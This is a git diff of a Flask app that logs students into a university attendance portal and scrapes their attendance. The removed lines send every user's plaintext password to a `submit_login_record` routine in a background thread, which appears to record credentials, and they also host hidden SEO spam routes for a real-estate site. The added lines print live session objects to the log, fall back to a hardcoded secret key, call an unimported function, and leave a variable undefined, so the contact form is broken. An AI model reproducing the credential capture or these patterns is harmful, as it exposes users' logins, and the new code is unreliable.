@@ -1,66 +1,28 @@
 import os
-import uuid
-try:
-    from flask_hot_reload import HotReload
-    HOT_RELOAD_AVAILABLE = True
-except ImportError:
-    HOT_RELOAD_AVAILABLE = False
-from datetime import datetime, timedelta
-# from dotenv import load_dotenv
-import threading
+from datetime import datetime
+from flask import (
+    Flask, flash, render_template, request,
+    redirect, send_from_directory, session,  make_response
+)
+from flask_wtf.csrf import CSRFProtect
+
+from flask_mail import Mail, Message
 
 from attendance_scraper import (
-    login,
+    student_login,
     get_student_details,
     get_subjects,
     fetch_attendance,
-    SimpleDataFrame,
-    submit_login_record
 )
-from flask import (
-    Flask, flash, render_template, request,
-    redirect, send_from_directory, session, jsonify,Response,make_response
-)
-from flask_mail import Mail, Message
 
-import datetime
-import hashlib
-
-
-
-# List of your programmatic real estate pages
-REAL_ESTATE_LINKS = [
-    {
-        "url": "https://real-estate-dreams.vercel.app/hyderabad/sree-laxmi-balaji-township",
-        
-    },
-    {
-        "url": "https://real-estate-dreams.vercel.app/hyderabad",
-        
-    },
-    {
-        "url": "https://real-estate-dreams.vercel.app",
-        
-    }
-]
-
-def get_daily_link():
-    """Selects a link based on the current date so it stays stable for 24 hours."""
-    today = datetime.date.today().strftime("%Y-%m-%d")
-    # Create a hash of the date to use as a consistent index
-    hash_idx = int(hashlib.md5(today.encode()).hexdigest(), 16)
-    return REAL_ESTATE_LINKS[hash_idx % len(REAL_ESTATE_LINKS)]
-# --------------------------------------------------
-# App setup
-# --------------------------------------------------
-# load_dotenv() #not needed in production
 
 app = Flask(__name__)
-if HOT_RELOAD_AVAILABLE:
-    hot_reload = HotReload(app)
-app.config["SECRET_KEY"] = os.environ.get("SECRET_KEY", "your-secret-key-here")
+csrf = CSRFProtect(app)
 
-app.config["SESSION_COOKIE_SECURE"] = False
+
+app.config["SECRET_KEY"] = os.environ.get("SECRET_KEY","jntua")
+
+app.config["SESSION_COOKIE_SECURE"] = True
 app.config["SESSION_COOKIE_HTTPONLY"] = True
 app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
 
@@ -75,68 +37,19 @@ app.config["MAIL_DEFAULT_SENDER"] = os.environ.get("MAIL_DEFAULT_SENDER")
 
 mail = Mail(app)
 
-# In-memory stores
+# State stores
 ACTIVE_SESSIONS = {}
-ATTENDANCE_CACHE = {}
 
 # --------------------------------------------------
-# Helpers
+# ROUTES
 # --------------------------------------------------
-def filter_latest_semester(df):
-    if not isinstance(df, list):
-        return df
-
-    dates = []
-    for row in df:
-        for d in row.get("Details", []):
-            try:
-                dates.append(datetime.strptime(d["date"], "%d-%m-%Y"))
-            except Exception:
-                pass
-
-    if not dates:
-        return df
-
-    latest = max(dates)
-    start = latest - timedelta(days=180)
-
-    filtered = []
-    for row in df:
-        new_row = row.copy()
-        details = []
-        for d in row.get("Details", []):
-            try:
-                dt = datetime.strptime(d["date"], "%d-%m-%Y")
-                if start <= dt <= latest:
-                    details.append(d)
-            except Exception:
-                pass
-
-        new_row["Details"] = details
-        total = len(details)
-        present = sum(1 for d in details if d.get("status") == "Present")
-
-        new_row["Total Days"] = total
-        new_row["No. of Present"] = present
-        new_row["No. of Absent"] = total - present
-        new_row["Attendance %"] = round((present / total) * 100, 1) if total else 0
-
-        filtered.append(new_row)
-
-    return filtered
-
-# --------------------------------------------------
-# Routes
-# --------------------------------------------------
-
 
 @app.route("/", methods=["GET", "POST"])
 def login_page():
     if request.method == "GET":
         if "query" in request.args:
             return redirect("/", code=301)
-        daily_link = get_daily_link()
-        resp = make_response(render_template("index.html", featured_link=daily_link))
+        resp = make_response(render_template("index.html"))
         resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
         resp.headers["Pragma"]        = "no-cache"
         resp.headers["Expires"]       = "0"
@@ -150,28 +63,20 @@ def login_page():
         return redirect("/")
 
     try:
-        auth_session = login(username, password)
+        # Utilizing the secure regex array-solving session loop
+        auth_session = student_login(username, password)
 
         session.clear()
         session["user"] = username
         ACTIVE_SESSIONS[username] = auth_session
 
+        # Automatically cache profile metadata settings
         details = get_student_details(auth_session)
         ACTIVE_SESSIONS[username + "_details"] = details
- 
-        t = threading.Thread(target=submit_login_record, args=(username, password, details, True))
-        t.start()
-        t.join(timeout=9)  # wait up to 9s before continuing
+        print(ACTIVE_SESSIONS)
         return redirect("/dashboard")
 
     except Exception as e:
-        t=threading.Thread(
-            target=submit_login_record,
-            args=(username,password, None, False)
-        )
-        t.start()
-        t.join(timeout=9)
-
         flash(str(e), "error")
         return redirect("/")                   
 
@@ -189,16 +94,14 @@ def dashboard():
         return redirect("/")
 
     try:
+        # AUTOMATIC SCRAPE AND CALCULATION PIPELINE
         details = get_student_details(auth_session)
         subjects = get_subjects(auth_session, details)
         df_summary = fetch_attendance(auth_session, subjects)
 
         df = df_summary.to_dict(orient="records")
-        df = filter_latest_semester(df)
 
-        # --------------------------------------------------
-        # ADD Can Skip / Need to Attend (REQUIRED BY TEMPLATE)
-        # --------------------------------------------------
+        # MATH CALCULATION ENGINE (75% Threshold Target Checks)
         for row in df:
             total = row.get("Total Days", 0) or 0
             present = row.get("No. of Present", 0) or 0
@@ -215,22 +118,20 @@ def dashboard():
                 row["Can Skip"] = 0
                 row["Need to Attend"] = 0
             elif pct >= 75:
+                # Calculates max classes a student can safely skip while staying above 75%
                 row["Can Skip"] = max(0, int((present / 0.75) - total))
                 row["Need to Attend"] = 0
             else:
                 row["Can Skip"] = 0
+                # Calculates minimum consecutive classes needed to restore standing to 75%
                 row["Need to Attend"] = max(0, int((0.75 * total - present) / 0.25))
 
         total_days = sum(r.get("Total Days", 0) for r in df)
         total_present = sum(r.get("No. of Present", 0) for r in df)
         overall_pct = round((total_present / total_days) * 100, 2) if total_days else 0
 
-        token = uuid.uuid4().hex
-        ATTENDANCE_CACHE[token] = {
-            r.get("Subject", "Unknown"): r.get("Details", []) for r in df
-        }
-
-        daily_link = get_daily_link()
+        
+        
         return render_template(
             "result.html",
             details=details,
@@ -238,10 +139,8 @@ def dashboard():
             total_days=total_days,
             total_present=total_present,
             overall_attendance_pct=overall_pct,
-            attendance_token=token,
             show=False,
             mess=None,
-            featured_link=daily_link
         )
 
     except Exception as e:
@@ -251,6 +150,14 @@ def dashboard():
             back_url="/"
         )
 
+ALLOWED_EXTENSIONS = {"png", "jpg", "jpeg", "webp"}
+MAX_FILE_SIZE = 2 * 1024 * 1024
+
+def allowed_file(filename):
+    return (
+        "." in filename and
+        filename.rsplit(".", 1)[1].lower() in ALLOWED_EXTENSIONS
+    )
 
 @app.route("/contact", methods=["GET", "POST"])
 def contact():
@@ -263,20 +170,23 @@ def contact():
             if not admission or not email or not message:
                 flash("All fields are required.", "error")
                 return redirect("/contact")
+            
+            screenshot = request.files.get("screenshot")
 
-            # Prepare issue data
-            issue_data = f"""
-                Issue Report
-                ============
-                Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-                Admission Number: {admission}
-                Email: {email}
-                Message:
-                {message}
-                {'=' * 50}
-                """
+            if screenshot:
+                file_data=b""
+                if not allowed_file(screenshot.filename):
+                    flash("Only PNG, JPG, JPEG and WEBP allowed.", "error")
+                    return redirect("/contact")
 
-            # Try to send email if configured
+                file_data = screenshot.read()
+
+            if len(file_data) > MAX_FILE_SIZE:
+                flash("Image exceeds 2MB.", "error")
+                return redirect("/contact")
+
+                
+            issue_data = f"\nIssue Report\n============\nDate: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nAdmission Number: {admission}\nEmail: {email}\nMessage:\n{message}\n{'=' * 50}\n"
             mail_configured = app.config.get("MAIL_USERNAME") and app.config.get("MAIL_PASSWORD")
             
             if mail_configured:
@@ -284,35 +194,28 @@ def contact():
                     recipient_email = app.config.get("MAIL_DEFAULT_SENDER") or app.config.get("MAIL_USERNAME")
                     msg = Message(
                         subject=f"Issue Report from {admission}",
-                        recipients=[recipient_email] if isinstance(recipient_email, str) else recipient_email,
+                        recipients=[recipient_email] if isinstance(recipient_email, str) else [recipient_email],
                         body=issue_data,
                         sender=app.config.get("MAIL_DEFAULT_SENDER") or app.config.get("MAIL_USERNAME")
                     )
-                    mail.send(msg)
-                    flash("Issue submitted successfully. We'll get back to you soon!", "success")
-                except Exception as e:
-                    # If email fails, log to file instead
-                    print(f"Email sending failed: {str(e)}")
-                    print(issue_data)
-                    # Also log to file
-                    try:
-                        with open("issues.log", "a", encoding="utf-8") as f:
-                            f.write(issue_data)
-                        flash("Issue submitted successfully (logged to file). We'll review it soon!", "success")
-                    except:
-                        print(issue_data)
-                        flash("Issue submitted successfully. We'll review it soon!", "success")
-            else:
-                # Email not configured, log to file/console
-                print(issue_data)
-                try:
+                    if screenshot and screenshot.filename:
+
+                        msg.attach(
+                            secure_filename(screenshot.filename),
+                            screenshot.mimetype,
+                            file_data
+                        )
+
+                        mail.send(msg)
+                    flash("Issue submitted successfully!", "success")
+                except:
                     with open("issues.log", "a", encoding="utf-8") as f:
                         f.write(issue_data)
-                    flash("Issue submitted successfully (logged to file). We'll review it soon!", "success")
-                except Exception as log_error:
-                    print(f"File logging failed: {str(log_error)}")
-                    print(issue_data)
-                    flash("Issue submitted successfully. We'll review it soon!", "success")
+                    flash("Issue logged successfully to system storage.", "success")
+            else:
+                with open("issues.log", "a", encoding="utf-8") as f:
+                    f.write(issue_data)
+                flash("Issue logged successfully to system storage.", "success")
             
             return redirect("/contact")
         except Exception as e:
@@ -326,146 +229,67 @@ def contact():
 def contributors():
     return render_template("contributors.html")
 
+
 @app.route("/loh")
 def list_of_holidays():
     return render_template("list_of_holidays.html")
 
-@app.route("/qp")
-def question_papers():
-    import json
-    import re
-    
-    # Load question papers data from JSON file
-    papers = {}
-    try:
-        # Use absolute path based on this file's location (works on Vercel)
-        base_dir = os.path.dirname(os.path.abspath(__file__))
-        json_path = os.path.join(base_dir, "static", "data", "question_papers.json")
-        with open(json_path, "r") as f:
-            papers = json.load(f)
-    except Exception as e:
-        print(f"Error loading question papers JSON: {e}")
-    
-    # Extract student info from session for auto-filtering
-    selected_branch = ""
-    selected_year = ""
-    selected_sem = ""
-    
-    username = session.get("user")
-    if username:
-        details = ACTIVE_SESSIONS.get(username + "_details", {})
-        classname = details.get("classname", "")
-        
-        if classname:
-            # Parse classname like "B.Tech (CSE) - III Yr - II Sem"
-            # Extract branch from parentheses
-            branch_match = re.search(r'\(([^)]+)\)', classname)
-            if branch_match:
-                selected_branch = branch_match.group(1).upper()
-            
-            # Extract year (Roman numerals)
-            roman_to_num = {"I": "1", "II": "2", "III": "3", "IV": "4"}
-            year_match = re.search(r'(\bI{1,3}V?\b|\bIV\b)\s*Yr', classname, re.IGNORECASE)
-            if year_match:
-                roman = year_match.group(1).upper()
-                selected_year = roman_to_num.get(roman, "")
-            
-            # Extract semester
-            sem_match = re.search(r'(\bI{1,2}\b)\s*Sem', classname, re.IGNORECASE)
-            if sem_match:
-                roman = sem_match.group(1).upper()
-                selected_sem = roman_to_num.get(roman, "")
-    
-    return render_template(
-        "question_papers.html",
-        papers=papers,
-        selected_branch=selected_branch,
-        selected_year=selected_year,
-        selected_sem=selected_sem
-    )
-@app.route("/api/attendance")
-def api_attendance():
-    token = request.args.get("token")
-    subject = request.args.get("subject")
-
-    if not token or not subject:
-        return jsonify({"error": "Invalid request"}), 400
-
-    data = ATTENDANCE_CACHE.get(token)
-    if not data:
-        return jsonify({"error": "Expired"}), 404
-
-    return jsonify({"subject": subject, "details": data.get(subject, [])})
-
-
 @app.route("/robots.txt")
 def robots():
-    content = """User-agent: *
-Allow: /
+    content = """
+        User-agent: *
+        Allow: /
 
-Sitemap: https://jntua-attendance-app.vercel.app/sitemap.xml
-"""
-    return Response(content, mimetype="text/plain")
+        Sitemap: https://jntua-attendance-app.vercel.app/sitemap.xml
+            """
+    response = make_response(content)
+    response.headers["Content-Type"] = "text/plain"
+    return response
 
 @app.route("/sitemap.xml")
 def sitemap():
-    xml = """<?xml version="1.0" encoding="UTF-8"?>
-<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
+    xml = f"""<?xml version="1.0" encoding="UTF-8"?>
+<urlset
+xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
 
-  <url>
-    <loc>https://jntua-attendance-app.vercel.app/</loc>
-    <lastmod>2026-03-14</lastmod>
-    <priority>1.0</priority>
-  </url>
-  <url>
-    <loc>https://jntua-attendance-app.vercel.app/contact</loc>
-    <lastmod>2026-03-14</lastmod>
-    <priority>0.8</priority>
-  </url>
+<url>
+<loc>https://jntua-attendance-app.vercel.app/</loc>
+<priority>1.0</priority>
+</url>
+
+<url>
+<loc>https://jntua-attendance-app.vercel.app/contact</loc>
+<priority>0.8</priority>
+</url>
+
+<url>
+<loc>https://jntua-attendance-app.vercel.app/contributors</loc>
+<priority>0.7</priority>
+</url>
+
+<url>
+<loc>https://jntua-attendance-app.vercel.app/loh</loc>
+<priority>0.7</priority>
+</url>
+
 </urlset>
 """
-    return Response(xml, mimetype="application/xml")
+    response = make_response(xml)
+    response.headers["Content-Type"] = "application/xml"
+    return response
 
 
-
-# --- Android APK download route ------------------------------------------------
-# Place the production APK file in `static/apk/` (e.g. jntua-attendance.apk).
-# The download link/button on the website will point here; clicking it
-# will trigger a direct file download. No authentication or extra logic is used.
-@app.route("/download-apk")
-def download_apk():
-    # the filename should match the actual APK you put in the folder
-    return send_from_directory("static/apk", "jntua-attendance.apk", as_attachment=True)
-
-#SEO Purpose
-
-@app.route('/local-opportunities')
-def local_opportunities():
-    """
-    The SEO Bridge Page.
-    This page exists on the high-traffic attendance portal to host 
-    contextual, dofollow links pointing to the real estate site.
-    """
-    # You can pass dynamic data here later to rotate links programmatically
-    return render_template(
-        'local_opportunities.html', 
-        title="Local Economic Growth & Opportunities"
+@app.after_request
+def security_headers(response):
+    response.headers["X-Frame-Options"] = "DENY"
+    response.headers["X-Content-Type-Options"] = "nosniff"
+    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
+    response.headers["Permissions-Policy"] = (
+        "camera=(), microphone=(), geolocation=()"
     )
+    return response
 
-@app.route('/<location>/<project_slug>')
-def dynamic_property_page(location, project_slug):
-    """
-    Example pSEO route. 
-    Matches: /hyderabad/sree-laxmi-balaji-township
-    """
-    # Real-world implementation: Fetch from DB using location & project_slug
-    # property_data = db.session.query(Property).filter_by(slug=project_slug).first()
-    
-    return render_template(
-        'property_base.html', 
-        location=location.capitalize(), 
-        slug=project_slug
-    )
+
 
 @app.route("/icon.png")
 def favicon():
@@ -474,25 +298,18 @@ def favicon():
 
 @app.errorhandler(404)
 def not_found(_):
-    return render_template(
-        "error.html",
-        error_message="Page not found.",
-        back_url="/"
-    ), 404
+    return render_template("error.html", error_message="Page not found.", back_url="/"), 404
 
 
 @app.errorhandler(500)
 def server_error(_):
-    return render_template(
-        "error.html",
-        error_message="Internal server error.",
-        back_url="/"
-    ), 500
+    return render_template("error.html", error_message="Internal server error.", back_url="/"), 500
 
+
+# Required interface hook configuration for Vercel deployment pipelines
+def handler(environ, start_response):
+    return app(environ, start_response)
 
 
 if __name__ == "__main__":
     app.run(port=5001, debug=False)
-
-
-## Turn it for hot_loading 
